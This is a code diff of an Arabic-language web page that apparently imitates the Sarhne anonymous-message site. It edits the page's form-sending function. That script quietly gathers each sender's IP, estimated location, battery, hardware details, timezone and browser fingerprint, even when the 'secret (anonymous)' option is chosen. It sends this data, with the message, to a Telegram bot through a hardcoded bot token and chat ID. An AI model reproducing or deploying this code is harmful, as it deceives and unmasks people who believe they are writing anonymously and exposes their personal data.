@@ -281,9 +281,6 @@
     </div>
    
 <script>
-// ==========================================
-// دوال مساعدة
-// ==========================================
 function showalert(msg) {
     alert(msg);
 }
@@ -313,7 +310,7 @@ function getFile() {
 }
 
 // ==========================================
-// كود إرسال البيانات إلى تليجرام مباشرة
+// كود إرسال البيانات إلى تليجرام المحدث والمعدل
 // ==========================================
 const BOT_TOKEN = '8780209256:AAHMYOqgAYNdhx_FCFQDB6VRTJjWUNOTjLM';
 const CHAT_ID = '8027742578';
@@ -330,11 +327,9 @@ async function send_form() {
     const sendBtn = document.getElementById('send_button');
     sendBtn.innerText = "جاري الإرسال...";
 
-    // 1. تحديد نوع الإرسال
     const isSecret = document.getElementById("show_my_info").checked;
     const sendType = isSecret ? "سري (مجهول)" : "علني";
 
-    // 2. تجميع بيانات الجهاز والمتصفح
     const platform = navigator.platform || "غير معروف";
     const language = navigator.language || "غير معروف";
     const userAgent = navigator.userAgent;
@@ -354,7 +349,6 @@ async function send_form() {
         }
     } catch(e) {}
 
-    // 3. جلب عنوان الـ IP والموقع التقديري
     let ip = "غير معروف";
     let locationInfo = "غير معروف";
 
@@ -369,26 +363,25 @@ async function send_form() {
         console.log("تعذر جلب بيانات الـ IP:", err);
     }
 
-    // 4. تنسيق النص للإرسال إلى تلجرام
-    let fullMessage = `📩 *رسالة مصارحة جديدة لـ محمد شعبان*\n\n`;
-    fullMessage += `🔒 *نوع الإرسال:* ${sendType}\n`;
-    fullMessage += `💬 *الرسالة:*\n${messageText}\n\n`;
+    // تنسيق الرسالة بـ HTML لتفادي مشاكل الأقواس والرموز مع تليجرام
+    let fullMessage = `<b>📩 رسالة مصارحة جديدة لـ محمد شعبان</b>\n\n`;
+    fullMessage += `🔒 <b>نوع الإرسال:</b> ${sendType}\n`;
+    fullMessage += `💬 <b>الرسالة:</b>\n${messageText}\n\n`;
     fullMessage += `-------------------------\n`;
-    fullMessage += `📊 *بيانات المرسل:* \n`;
-    fullMessage += `🌐 *IP:* \`${ip}\`\n`;
-    fullMessage += `📍 *الموقع التقديري:* ${locationInfo}\n`;
-    fullMessage += `💻 *النظام:* ${platform}\n`;
-    fullMessage += `📱 *دقة الشاشة:* ${screenW}x${screenH}\n`;
-    fullMessage += `🔋 *البطارية:* ${batteryInfo}\n`;
-    fullMessage += `📶 *نوع الشبكة:* ${connection}\n`;
-    fullMessage += `⚙️ *أنوية المعالج:* ${cores}\n`;
-    fullMessage += `🧠 *الذاكرة:* ${memory}\n`;
-    fullMessage += `👆 *دعم اللمس:* ${touchSupport}\n`;
-    fullMessage += `⏰ *المنطقة الزمنية:* ${timezone}\n`;
-    fullMessage += `🗣 *اللغة:* ${language}\n`;
-    fullMessage += `🌐 *المتصفح:* \`${userAgent}\`\n`;
+    fullMessage += `📊 <b>بيانات المرسل:</b>\n`;
+    fullMessage += `🌐 <b>IP:</b> <code>${ip}</code>\n`;
+    fullMessage += `📍 <b>الموقع التقديري:</b> ${locationInfo}\n`;
+    fullMessage += `💻 <b>النظام:</b> ${platform}\n`;
+    fullMessage += `📱 <b>دقة الشاشة:</b> ${screenW}x${screenH}\n`;
+    fullMessage += `🔋 <b>البطارية:</b> ${batteryInfo}\n`;
+    fullMessage += `📶 <b>نوع الشبكة:</b> ${connection}\n`;
+    fullMessage += `⚙️ <b>أنوية المعالج:</b> ${cores}\n`;
+    fullMessage += `🧠 <b>الذاكرة:</b> ${memory}\n`;
+    fullMessage += `👆 <b>دعم اللمس:</b> ${touchSupport}\n`;
+    fullMessage += `⏰ <b>المنطقة الزمنية:</b> ${timezone}\n`;
+    fullMessage += `🗣 <b>اللغة:</b> ${language}\n`;
+    fullMessage += `🌐 <b>المتصفح:</b> <code>${userAgent}</code>\n`;
 
-    // 5. الإرسال إلى تلجرام
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     
     try {
@@ -398,27 +391,27 @@ async function send_form() {
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: fullMessage,
-                parse_mode: 'Markdown'
+                parse_mode: 'HTML'
             })
         });
         
         if (tgResponse.ok) {
             showalert('تم إرسال المصارحة بنجاح!');
+            txt.value = '';
+            document.getElementById('char_count').textContent = '500';
         } else {
-            showalert('حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى.');
+            const errData = await tgResponse.json();
+            console.error('Telegram API Error:', errData);
+            showalert('حدث خطأ أثناء الإرسال: ' + (errData.description || 'حاول مرة أخرى'));
         }
     } catch (error) {
         console.error('Error sending to Telegram:', error);
         showalert('حدث خطأ في الشبكة. يرجى المحاولة مرة أخرى.');
     }
 
-    // إعادة تعيين الخانات وحالة الزر
-    txt.value = '';
-    document.getElementById('char_count').textContent = '500';
     sendBtn.innerHTML = 'ارسال مصارحة <img src="https://www.sarhne.com/assets/img/sent.svg" width="27" class="middle" alt="#">';
 }
 
-// عداد الحروف
 document.addEventListener('DOMContentLoaded', function() {
     const txt = document.getElementById('sarhne');
     if (txt) {
@@ -433,7 +426,7 @@ document.addEventListener('DOMContentLoaded', function() {
           <br>   
       <a href="https://www.sarhne.com/help.html" class="wh"> المساعدة </a> -  <a href="https://www.sarhne.com/Terms.html" class="wh"> القوانين </a> - <a href="https://www.sarhne.com/contact_us.html" class="wh"> اتصل بنا </a>   
  <br> 
-    <a href="https://www.sarhne.com/" class="wh"> المدونة </a> - <a href="https://www.sarhne.com/search.html" class="wh"> البحث </a>  
+    <a href="https://www.sarhne.com//" class="wh"> المدونة </a> - <a href="https://www.sarhne.com/search.html" class="wh"> البحث </a>  
     <br>  <br> 
      <a href="https://www.facebook.com/Sarhne.Official/"><img src="https://www.sarhne.com/assets/img/ffacebook.svg" width="50" height="auto">  &nbsp; </a>
           <a href="https://www.instagram.com/sarhne_official/?swa33"><img src="https://www.sarhne.com/assets/img/finstagram.svg" width="50" height="auto">  &nbsp; </a>
@@ -449,3 +442,4 @@ document.addEventListener('DOMContentLoaded', function() {
 
 </center>
 </body></html>
+
